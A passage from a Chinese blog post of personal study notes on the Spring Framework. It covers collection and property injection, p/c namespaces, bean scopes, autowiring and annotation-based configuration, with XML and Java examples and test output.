class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;divers&quot;</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;username&quot;</span>&gt;</span>月石<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;password&quot;</span>&gt;</span>月曜<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">props</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;wife&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我在这里觉得比较重要的区别就是在于prop和map当中的差别</p>
<p>map因为强调的是键值对关系，所以写在map的标签当中，而prop中的值容易修改，所以我们写在标签中间。</p>
<p>总而言之记住就好了         </p>
<p>测试结果如下：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Student&#123;address=Address&#123;address=&#x27;安徽芜湖中出&#x27;&#125;, name=&#x27;月石&#x27;,</span><br><span class="line">books=[Java基础, Java进程, Java编写, JavaIOC, JavaSpring],</span><br><span class="line">hobbies=[唱歌, 下棋, 睡觉], </span><br><span class="line">cards=&#123;月曜=1751111, 月石=138217&#125;, </span><br><span class="line">games=[战地, 使命召唤, EA, 奥里给], wife=&#x27;null&#x27;, </span><br><span class="line">info=&#123;password=月曜, url=/weibos?SSL=xxx, divers=mysql, username=月石&#125;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="4-3-拓展方式注入"><a href="#4-3-拓展方式注入" class="headerlink" title="4.3 拓展方式注入"></a>4.3 拓展方式注入</h2><p>除了上面的依赖注入以外，我们还可以使用P命名空间和C命名空间注入，但是他们必须利用XML约束。</p>
<p>具体例子如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;月石&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">value</span>=<span class="string">&quot;20&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span> <span class="attr">id</span>=<span class="string">&quot;user2&quot;</span> <span class="attr">p:age</span>=<span class="string">&quot;20&quot;</span> <span class="attr">p:name</span>=<span class="string">&quot;月曜&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user3&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span> <span class="attr">c:age</span>=<span class="string">&quot;21&quot;</span> <span class="attr">c:name</span>=<span class="string">&quot;月笙&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ClassPathXmlApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;bean2.xml&quot;</span>);</span><br><span class="line">    User user = context.getBean(<span class="string">&quot;user&quot;</span>, User.class);</span><br><span class="line">    User user2 = context.getBean(<span class="string">&quot;user2&quot;</span>, User.class);</span><br><span class="line"></span><br><span class="line">    System.out.println(user);</span><br><span class="line">    System.out.println(user2);</span><br><span class="line">    User user3 = context.getBean(<span class="string">&quot;user3&quot;</span>, User.class);</span><br><span class="line"></span><br><span class="line">    System.out.println(user3);</span><br></pre></td></tr></table></figure>

<p>（想使用test记得导入junit哦</p>
<p>相同的，使用c标签就相当于使用构造器呢。</p>
<p>那么玩什么要使用c标签和p标签呢？</p>
<p>我猜想是如果我们对这种简单的注入方式统一的使用标签来进行注入，而复杂的使用prop来进行注入，可以简化我们的代码，当xml繁琐的时候也不至于一塌糊涂了把</p>
<p>官方文档：</p>
<p>namespace is not as flexible as the standard XML format. For example, the format for declaring property references clashes with properties that end in Ref, whereas the standard XML format does not. We recommend that you choose your approach carefully and communicate this to your team members, to avoid producing XML documents that use all three approaches at the same time.</p>
<p>意思是不够灵活，同时需要与团队沟通好，但是可以简化代码？</p>
<h1 id="5-Bean的作用域"><a href="#5-Bean的作用域" class="headerlink" title="5 Bean的作用域"></a>5 Bean的作用域</h1><p>主要是探讨原型和单例之间的差距：</p>
<ul>
<li><p>单例：</p>
<p>之后我们创建的时候即使创建很多个类，依然只有一个原型</p>
</li>
<li><p>多例：</p>
<p>每创建一个新的类都会创建一个新的类</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;bean class&#x3D;&quot;com.ys.pojo.User&quot; id&#x3D;&quot;user2&quot; p:age&#x3D;&quot;20&quot; p:name&#x3D;&quot;月曜&quot; scope&#x3D;&quot;prototype&quot;&#x2F;&gt;</span><br><span class="line">&lt;bean class&#x3D;&quot;com.ys.pojo.User&quot; id&#x3D;&quot;user2&quot; p:age&#x3D;&quot;20&quot; p:name&#x3D;&quot;月曜&quot; scope&#x3D;&quot;singleton&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p>测试代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">User user = context.getBean(<span class="string">&quot;user&quot;</span>, User.class);</span><br><span class="line">       User user2 = context.getBean(<span class="string">&quot;user&quot;</span>, User.class);</span><br><span class="line">       System.out.println(user.hashCode());</span><br><span class="line">       System.out.println(user2.hashCode());</span><br><span class="line">       System.out.println(user==user2);</span><br></pre></td></tr></table></figure>

<p>得到结果：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1075738627</span></span><br><span class="line"><span class="number">282828951</span></span><br><span class="line"><span class="keyword">false</span></span><br></pre></td></tr></table></figure>



<h1 id="6-Bean的自动装配"><a href="#6-Bean的自动装配" class="headerlink" title="6. Bean的自动装配"></a>6. Bean的自动装配</h1><ul>
<li>自动装配是Spring满足bean依赖的一种方式！</li>
<li>Spring会在上下文中自动寻找，并自动给bean装配属性</li>
</ul>
<p>在Spring中有三种自动装配的方式：</p>
<ol>
<li>在XML中显式的配置</li>
<li>在Java中显式的配置</li>
<li>隐式的自动装配bean【重要】</li>
</ol>
<h2 id="6-1-测试环境"><a href="#6-1-测试环境" class="headerlink" title="6.1 测试环境"></a>6.1 测试环境</h2><ol>
<li>一个人有两条狗！</li>
</ol>
<p>Cat：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cat</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;miao&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Dog：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;wang&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Person：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Cat cat;</span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Cat <span class="title">getCat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCat</span><span class="params">(Cat cat)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cat = cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Dog <span class="title">getDog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> dog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDog</span><span class="params">(Dog dog)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.dog = dog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cat=&quot;</span> + cat +</span><br><span class="line">                <span class="string">&quot;, dog=&quot;</span> + dog +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>beans.xml:</p>
<p>byName配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.Cat&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.Dog&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;person&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.Person&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byName&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;月石&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>byType：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span>  <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.Cat&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span>  <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.Dog&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;person&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.Person&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byType&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;月石&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>byName就是在上下文中寻找id和所需求匹配的值，而byType则是在上下文中去寻找和类型相同类</p>
<p>于是我又产生了一个疑惑，如果存在跨文件的情况呢？</p>
<p>于是我又创建了一个bean1.xml来储存</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;person&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.Person&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byName&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;dnm&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到结果：</p>
<p>月石 miao wang</p>
<p>但是如果我把beans的注释之后呢</p>
<p>则是</p>
<p>dnm miao wang</p>
<p>这就说明，当我们使用beans.xml装配之后，系统会优先在当前xml来进行查找，之后才会去其他地方查找</p>
<p>除此之外我们需要记住：</p>
<ul>
<li>当我们使用byName的时候，必须保证当前bean的id唯一且正确</li>
<li>当我们使用byType的时候，必须保证当前bean的class唯一且正确</li>
</ul>
<h2 id="6-2使用注解实现自动装配"><a href="#6-2使用注解实现自动装配" class="headerlink" title="6.2使用注解实现自动装配"></a>6.2使用注解实现自动装配</h2><p>jdk1.5支持，spring2.5支持</p>
<p>使用注解须知：</p>
<ol>
<li>导入约束</li>
<li>配置注解的支持</li>
</ol>
<p>必须导入如下配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">       http://springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">       http://springframework.org/schema/context/spring-context.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">       https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>之后我们便可以对单个值进行注入。</p>
<p>在Person类当中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Cat cat;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Cat <span class="title">getCat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCat</span><span class="params">(Cat cat)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cat = cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Dog <span class="title">getDog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> dog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDog</span><span class="params">(Dog dog)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.dog = dog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cat=&quot;</span> + cat +</span><br><span class="line">                <span class="string">&quot;, dog=&quot;</span> + dog +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我们使用atuowired注入之后，甚至连set方法都不需要构造了，为什么呢？</p>
<p>【据说是因为他利用反射的方式获取代码，我也不是很懂</p>
<p>如果bean当中的配置多起来了，我们想构造的话，就需要通过</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Qualifier(value = &quot;cat&quot;)</span></span><br></pre></td></tr></table></figure>

<p>显式的定义代码</p>
<h1 id="7-注解开发"><a href="#7-注解开发" class="headerlink" title="7.注解开发"></a>7.注解开发</h1><p>在Spring4之后，我们必须保证Spring的AOP包被导入</p>
<p>在使用注解的时候需要导入context约束，增加注解的支持</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">       http://springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">       http://springframework.org/schema/context/spring-context.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">       https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br></pre></td></tr></table></figure>



<ol>
<li><p>bean</p>
<p>当我们使用注解之后，bean可以如下方法进入导入：</p>
<p>第一步，导入包：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.ys&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>第二步，去类的上面添加注释：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意@Component，这个注解的意思等价于</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&#x27;user&#x27;</span> <span class="attr">class</span>=<span class="string">com.ys.pojo.user</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>属性如何注入</p>
<p>使用类我们也是可以注入值的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Value(&quot;月石&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br></pre></td></tr></table></figure>

<p>等价于：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;月石&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是通过这我们就可以明白，注解注入值不适合注入复杂类型的值。</p>
</li>
<li><p>衍生的注解</p>
<p>通过@Component后面为了分层，我们衍生出了如下注解：</p>
<ul>
<li>Dao:  @Repository</li>
<li>Service:  @Service</li>
<li>Controller: @Controller</li>
</ul>
<p>这四个类的本质都没有区别，都代表注册一个bean去XML当中，只不过这样写可以使得我们MVC架构更加清晰明了</p>
</li>
<li><p>自动装配</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">- <span class="meta">@Atuowired</span>: 自动装配</span><br><span class="line">- <span class="meta">@Nullable</span>： 允许字段为<span class="keyword">null</span></span><br><span class="line">- <span class="meta">@Resource</span>  ：通过名字，类型自动装配</span><br></pre></td></tr></table></figure>
</li>
<li><p>作用域</p>
<p>其实通过注解也可以对作用域进行注解，但是我觉得不是很方便。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Scope()</span></span><br></pre></td></tr></table></figure>

<p>为什么不通过XML呢？</p>
</li>
<li><p>小结</p>
</li>
</ol>
<p>在这章我们学会了利用注解进行开发，可以通过注解摆脱XML，但是我通过学习这一章节，我感觉Spring此时还是不够成熟，大部分的时候还是利用XML更加方便，复杂的东西丢给XML来做，简单的利用注解注入就行</p>
<p>所以最佳实践应该是：</p>
<ul>
<li>利用XML手动的建立每个bean，这样方便程序员的互相合作</li>
<li>XML注入MAP类型等</li>
<li>利用注释手动的注入简单值，降低开发成本</li>
</ul>
<p>同时我们还需要了解：</p>
<ul>
<li>XML的优势就在于他更加清楚明了，起码在Spring来说是这样的，同时XML还方便跨文件配合</li>
<li>而注解更加的方便我们进行开发，注入值，降低程序员的成本（但是增加了运维的难度</li>
</ul>
<p>使用注解开发的一个简单例子，还是一个人两个宠物：</p>
<p>🐱的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cat</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;🐱：wdnmd&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>🐕的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line">org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;🐕：wdnmd&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>人的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Value(&quot;月石&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Cat cat;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Cat <span class="title">getCat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCat</span><span class="params">(Cat cat)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cat = cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Dog <span class="title">getDog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> dog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDog</span><span class="params">(Dog dog)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.dog = dog;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Mytest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ClassPathXmlApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">        User user = context.getBean(<span class="string">&quot;user&quot;</span>, User.class);</span><br><span class="line"></span><br><span class="line">        System.out.println(user.getName());</span><br><span class="line">        user.getCat().shout();</span><br><span class="line">        user.getDog().shout();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>依然能够正常的得到结果~</p>
<h1 id="8-完全使用Java配置Spring"><a href="#8-完全使用Java配置Spring" class="headerlink" title="8 完全使用Java配置Spring"></a>8 完全使用Java配置Spring</h1><p>我们现在要完全使用Javaconfig完全的代替XML了，SpringBoot当中也是这样做的，我还是有点慌，感觉没有能够适应过来</p>
<p>还是很有必要将XML的方式和Java类的方式进行对比，如果我们想要使用Javaconfig来代替XML</p>
<p>构造如下Java代码:</p>
